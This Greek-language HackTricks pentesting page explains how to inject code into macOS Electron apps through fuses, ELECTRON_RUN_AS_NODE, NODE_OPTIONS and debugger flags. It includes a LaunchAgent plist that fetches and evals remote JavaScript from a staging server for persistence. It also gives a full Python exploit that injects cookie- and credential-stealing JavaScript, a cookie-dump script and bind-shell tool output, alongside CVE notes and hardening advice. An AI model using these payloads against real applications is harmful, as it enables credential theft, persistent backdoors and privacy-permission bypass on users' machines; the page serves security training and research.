# Injection σε Electron Applications του macOS

{{#include ../../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Αν δεν γνωρίζετε τι είναι το Electron, μπορείτε να βρείτε [**πολλές πληροφορίες εδώ**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Προς το παρόν, αρκεί να γνωρίζετε ότι το Electron εκτελεί **node**.\
Και το node διαθέτει ορισμένες **παραμέτρους** και **env variables** που μπορούν να χρησιμοποιηθούν για να **εκτελέσουν άλλο code**, πέρα από το υποδεικνυόμενο file.

### Electron Fuses

Αυτές οι τεχνικές θα συζητηθούν στη συνέχεια, αλλά τα τελευταία χρόνια το Electron έχει προσθέσει αρκετά **security flags για την αποτροπή τους**. Αυτά είναι τα [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) και αυτά χρησιμοποιούνται για να **εμποδίζουν** τις Electron apps στο macOS από το να **φορτώνουν arbitrary code**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Αν είναι απενεργοποιημένο, αποτρέπει τη χρήση του env var **`ELECTRON_RUN_AS_NODE`** για injection code.
- **`EnableNodeCliInspectArguments`**: Αν είναι απενεργοποιημένο, params όπως `--inspect`, `--inspect-brk` δεν θα λαμβάνονται υπόψη. Αποτρέποντας με αυτόν τον τρόπο το injection code.
- **`EnableEmbeddedAsarIntegrityValidation`**: Αν είναι ενεργοποιημένο, το φορτωμένο **`asar`** **file** θα **επικυρώνεται** από το macOS. Με αυτόν τον τρόπο **αποτρέπεται** το **code injection** μέσω τροποποίησης των περιεχομένων αυτού του file.
- **`OnlyLoadAppFromAsar`**: Αν είναι ενεργοποιημένο, αντί να αναζητά για φόρτωση με την ακόλουθη σειρά: **`app.asar`**, **`app`** και τέλος **`default_app.asar`**, θα ελέγχει και θα χρησιμοποιεί μόνο το app.asar, διασφαλίζοντας έτσι ότι όταν **συνδυάζεται** με το **`embeddedAsarIntegrityValidation`** fuse είναι **αδύνατο** να **φορτωθεί μη επικυρωμένο code**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Αν είναι ενεργοποιημένο, η browser process χρησιμοποιεί το file με όνομα `browser_v8_context_snapshot.bin` για το V8 snapshot της.

Ένα ακόμη ενδιαφέρον fuse που δεν αποτρέπει το code injection είναι:

- **EnableCookieEncryption**: Αν είναι ενεργοποιημένο, το cookie store στον δίσκο κρυπτογραφείται χρησιμοποιώντας cryptography keys σε επίπεδο OS.

### Έλεγχος των Electron Fuses

Μπορείτε να **ελέγξετε αυτά τα flags** από μια application με:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Τροποποίηση των Electron Fuses

Όπως αναφέρεται στα [**docs**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), η διαμόρφωση των **Electron Fuses** βρίσκεται μέσα στο **Electron binary**, το οποίο περιέχει κάπου τη συμβολοσειρά **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

Στις εφαρμογές macOS αυτό βρίσκεται συνήθως στο `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Μπορείτε να φορτώσετε αυτό το αρχείο στο [https://hexed.it/](https://hexed.it/) και να αναζητήσετε το προηγούμενο string. Μετά από αυτό το string μπορείτε να δείτε σε ASCII έναν αριθμό «0» ή «1», που υποδεικνύει αν κάθε fuse είναι disabled ή enabled. Απλώς τροποποιήστε τον hex code (`0x30` είναι `0` και `0x31` είναι `1`) για να **τροποποιήσετε τις fuse values**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Σημειώστε ότι αν προσπαθήσετε να **αντικαταστήσετε** το **`Electron Framework` binary** μέσα σε μια εφαρμογή με αυτά τα bytes τροποποιημένα, η εφαρμογή δεν θα εκτελεστεί.

## RCE προσθέτοντας κώδικα σε Electron Applications

Ενδέχεται να υπάρχουν **external JS/HTML files** που χρησιμοποιεί ένα Electron App, επομένως ένας attacker θα μπορούσε να inject κώδικα σε αυτά τα αρχεία, των οποίων η signature δεν θα ελεγχθεί, και να εκτελέσει arbitrary code στο context της εφαρμογής.

> [!CAUTION]
> Ωστόσο, προς το παρόν υπάρχουν 2 περιορισμοί:
>
> - Η permission **`kTCCServiceSystemPolicyAppBundles`** είναι **απαραίτητη** για την τροποποίηση ενός App, επομένως από προεπιλογή αυτό δεν είναι πλέον δυνατό.
> - Το compiled **`asap`** file συνήθως έχει τα fuses **`embeddedAsarIntegrityValidation`** `και` **`onlyLoadAppFromAsar`** **enabled**
>
> Καθιστώντας αυτό το attack path πιο περίπλοκο (ή αδύνατο).

Σημειώστε ότι είναι δυνατό να γίνει bypass της απαίτησης της **`kTCCServiceSystemPolicyAppBundles`** αντιγράφοντας την εφαρμογή σε άλλον directory (όπως το **`/tmp`**), μετονομάζοντας τον φάκελο **`app.app/Contents`** σε **`app.app/NotCon`**, **τροποποιώντας** το **asar** file με τον **malicious** κώδικά σας, μετονομάζοντάς το ξανά σε **`app.app/Contents`** και εκτελώντας το.<sup>[[5]](#references)</sup>

Μπορείτε να κάνετε unpack τον κώδικα από το asar file με:
```bash
npx asar extract app.asar app-decomp
```
Και συσκευάστε το ξανά αφού το τροποποιήσετε με:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE με ELECTRON_RUN_AS_NODE

Σύμφωνα με [**το documentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), αν αυτή η env variable έχει οριστεί, θα ξεκινήσει τη διεργασία ως μια κανονική διεργασία Node.js.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Εάν το fuse **`RunAsNode`** είναι απενεργοποιημένο, η env var **`ELECTRON_RUN_AS_NODE`** θα αγνοηθεί και αυτό δεν θα λειτουργήσει.

### Injection από το App Plist

Όπως [**προτάθηκε εδώ**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), θα μπορούσατε να κάνετε abuse αυτής της env variable σε ένα plist για να διατηρήσετε persistence:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE με `NODE_OPTIONS`

Μπορείτε να αποθηκεύσετε το payload σε διαφορετικό αρχείο και να το εκτελέσετε:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Αν το fuse **`EnableNodeOptionsEnvironmentVariable`** είναι **disabled**, η εφαρμογή θα **ignore** το env var **NODE_OPTIONS** κατά την εκκίνησή της, εκτός αν έχει οριστεί το env variable **`ELECTRON_RUN_AS_NODE`**, το οποίο επίσης θα **ignored** αν το fuse **`RunAsNode`** είναι disabled.
>
> Αν δεν ορίσετε το **`ELECTRON_RUN_AS_NODE`**, θα εμφανιστεί το **error**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection από το App Plist

Μπορείτε να κάνετε abuse αυτό το env variable σε ένα plist για να διατηρήσετε persistence, προσθέτοντας αυτά τα keys:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE με inspecting

Σύμφωνα με [**αυτό**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), αν εκτελέσετε μια εφαρμογή Electron με flags όπως τα **`--inspect`**, **`--inspect-brk`** και **`--remote-debugging-port`**, θα είναι ανοιχτό ένα **debug port**, ώστε να μπορείτε να συνδεθείτε σε αυτό (για παράδειγμα από το Chrome, στη διεύθυνση `chrome://inspect`) και θα μπορείτε να **κάνετε inject κώδικα σε αυτό** ή ακόμη και να εκκινήσετε νέες διεργασίες.<sup>[[7]](#references)</sup>\
Για παράδειγμα:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
Σε [**αυτή την ανάρτηση**](https://hackerone.com/reports/1274695), το debugging γίνεται abuse ώστε ένα headless chrome να **κατεβάζει arbitrary files σε arbitrary locations**.<sup>[[8]](#references)</sup>

> [!TIP]
> Αν μια εφαρμογή έχει τον δικό της τρόπο να ελέγχει αν έχουν οριστεί env variables ή params όπως το `--inspect`, θα μπορούσατε να προσπαθήσετε να το **bypass** σε runtime χρησιμοποιώντας το arg `--inspect-brk`, το οποίο θα **σταματήσει την εκτέλεση** στην αρχή της εφαρμογής και θα εκτελέσει ένα bypass (για παράδειγμα, κάνοντας overwrite τα args ή τα env variables του τρέχοντος process).

Το παρακάτω ήταν ένα exploit όπου, κάνοντας monitoring και εκτελώντας την εφαρμογή με το param `--inspect-brk`, ήταν δυνατό να γίνει bypass η custom προστασία που διέθετε (κάνοντας overwrite τα params του process ώστε να αφαιρεθεί το `--inspect-brk`) και στη συνέχεια να γίνει injection ενός JS payload για dump cookies και credentials από την εφαρμογή:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Αν το fuse **`EnableNodeCliInspectArguments`** είναι απενεργοποιημένο, η εφαρμογή θα **αγνοεί τις παραμέτρους node** (όπως το **`--inspect`**) κατά την εκκίνησή της, εκτός αν έχει οριστεί η μεταβλητή περιβάλλοντος **`ELECTRON_RUN_AS_NODE`**, η οποία επίσης θα **αγνοηθεί** αν το fuse **`RunAsNode`** είναι απενεργοποιημένο.
>
> Ωστόσο, θα μπορούσατε ακόμη να χρησιμοποιήσετε την **παράμετρο electron `--remote-debugging-port=9229`**, αλλά το προηγούμενο payload δεν θα λειτουργήσει για την εκτέλεση άλλων διεργασιών.

Χρησιμοποιώντας την παράμετρο **`--remote-debugging-port=9222`**, είναι possible να κλαπούν ορισμένες πληροφορίες από το Electron App, όπως το **ιστορικό** (με εντολές GET) ή τα **cookies** του browser (καθώς είναι **αποκρυπτογραφημένα** μέσα στον browser και υπάρχει ένα **json endpoint** που τα επιστρέφει).

Μπορείτε να μάθετε πώς να το κάνετε [**εδώ**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) και [**εδώ**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) και να χρησιμοποιήσετε το automatic tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ή ένα απλό script όπως:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection από το App Plist

Μπορείτε να κάνετε abuse αυτής της env variable σε ένα plist για να διατηρήσετε persistence, προσθέτοντας αυτά τα keys:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Παράκαμψη TCC με κατάχρηση παλαιότερων εκδόσεων

> [!TIP]
> Ο TCC daemon του macOS δεν ελέγχει την έκδοση της εφαρμογής που εκτελείται. Επομένως, αν **δεν μπορείτε να κάνετε inject κώδικα σε μια Electron application** με κάποια από τις προηγούμενες τεχνικές, θα μπορούσατε να κατεβάσετε μια παλαιότερη έκδοση της APP και να κάνετε inject κώδικα σε αυτήν, καθώς θα εξακολουθήσει να έχει τα TCC privileges (εκτός αν το Trust Cache το αποτρέψει).

## Εκτέλεση μη-JS Κώδικα

Οι προηγούμενες τεχνικές θα σας επιτρέψουν να εκτελέσετε **JS code μέσα στη διεργασία της electron application**. Ωστόσο, θυμηθείτε ότι οι **child processes εκτελούνται υπό το ίδιο sandbox profile** με τη parent application και **κληρονομούν τα TCC permissions** της.\
Επομένως, αν θέλετε, για παράδειγμα, να κάνετε abuse entitlements για πρόσβαση στην camera ή το microphone, θα μπορούσατε απλώς να **εκτελέσετε ένα άλλο binary από τη διεργασία**.

## Αξιοσημείωτα Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Οι Electron ≤22.3.23 και διάφορες pre-releases των 23-27 επέτρεπαν σε έναν attacker με write access στον φάκελο `.app/Contents/Resources` να παρακάμψει τα fuses `embeddedAsarIntegrityValidation` **και** `onlyLoadAppFromAsar`. Το bug ήταν μια *file-type confusion* στον integrity checker, η οποία επέτρεπε τη φόρτωση ενός κατασκευασμένου **directory με όνομα `app.asar`** αντί για το validated archive, με αποτέλεσμα να εκτελείται οποιοδήποτε JavaScript υπήρχε μέσα σε αυτό το directory κατά την εκκίνηση της app. Επομένως, ακόμη και vendors που είχαν ακολουθήσει τις οδηγίες hardening και είχαν ενεργοποιήσει και τα δύο fuses παρέμεναν ευάλωτοι στο macOS.<sup>[[3]](#references)</sup>

Οι patched Electron versions είναι: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** και **27.0.0-alpha.7**. Attackers που εντοπίζουν μια application η οποία εκτελείται σε παλαιότερο build μπορούν να αντικαταστήσουν το `Contents/Resources/app.asar` με το δικό τους directory, ώστε να εκτελέσουν κώδικα με τα TCC entitlements της application.<sup>[[3]](#references)</sup>

### CVE cluster “RunAsNode” / “enableNodeCliInspectArguments” του 2024

Τον Ιανουάριο του 2024, μια σειρά από CVEs (CVE-2024-23738 έως CVE-2024-23743) ανέδειξε ότι πολλές Electron apps διανέμονται με τα fuses **RunAsNode** και **EnableNodeCliInspectArguments** ακόμη ενεργοποιημένα. Ένας local attacker μπορεί επομένως να επανεκκινήσει το πρόγραμμα με τη μεταβλητή περιβάλλοντος `ELECTRON_RUN_AS_NODE=1` ή με flags όπως το `--inspect-brk`, ώστε να το μετατρέψει σε μια *generic* Node.js process και να κληρονομήσει όλα τα sandbox και TCC permissions της application.<sup>[[4]](#references)</sup>

Παρότι η Electron team αμφισβήτησε την αξιολόγηση “critical” και επισήμανε ότι ένας attacker χρειάζεται ήδη local code–execution, το issue παραμένει χρήσιμο κατά το post-exploitation, επειδή μετατρέπει οποιοδήποτε vulnerable Electron bundle σε ένα *living-off-the-land* binary που μπορεί, για παράδειγμα, να διαβάσει Contacts, Photos ή άλλους sensitive resources στους οποίους είχε προηγουμένως παραχωρηθεί πρόσβαση στη desktop app.<sup>[[4]](#references)</sup>

Defensive guidance από τους Electron maintainers:<sup>[[4]](#references)</sup>

* Απενεργοποιήστε τα `RunAsNode` και `EnableNodeCliInspectArguments` fuses στα production builds.
* Χρησιμοποιήστε το νεότερο API **UtilityProcess** αν η application χρειάζεται νόμιμα ένα helper Node.js process, αντί να ενεργοποιήσετε ξανά αυτά τα fuses.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Το tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) μπορεί να χρησιμοποιηθεί εύκολα για να **εντοπίσει ευάλωτες electron applications** που είναι εγκατεστημένες και να κάνει inject code σε αυτές. Αυτό το tool θα προσπαθήσει να χρησιμοποιήσει την τεχνική **`--inspect`**:<sup>[[5]](#references)</sup>

Πρέπει να το κάνετε compile μόνοι σας και μπορείτε να το χρησιμοποιήσετε ως εξής:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Το Loki σχεδιάστηκε για να εγκαθιστά backdoor σε Electron applications, αντικαθιστώντας τα αρχεία JavaScript των εφαρμογών με τα JavaScript αρχεία Command & Control του Loki.

## References

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [macOS Injection μέσω Third-Party Frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [Παράκαμψη του ASAR Integrity μέσω σύγχυσης τύπου αρχείου (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Δήλωση σχετικά με τα CVEs του 'runAsNode' - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - Ένα νέο όπλο στο Red Teaming οπλοστάσιό σας - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Μεταβλητές περιβάλλοντος | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Γιατί οι Electron applications δεν μπορούν να αποθηκεύσουν τα secrets σας εμπιστευτικά: η επιλογή --inspect](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [Αναφορά HackerOne #1274695 - Η απομακρυσμένη αποσφαλμάτωση του Electron έγινε αντικείμενο κατάχρησης για τη λήψη αυθαίρετων αρχείων](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: Εξαγωγή Cookies με τη Remote Debugger Port του Chromium - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Αποσφαλμάτωση αποτυχιών εξαγωγής Cookies με τον Remote Debugger του Chromium - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
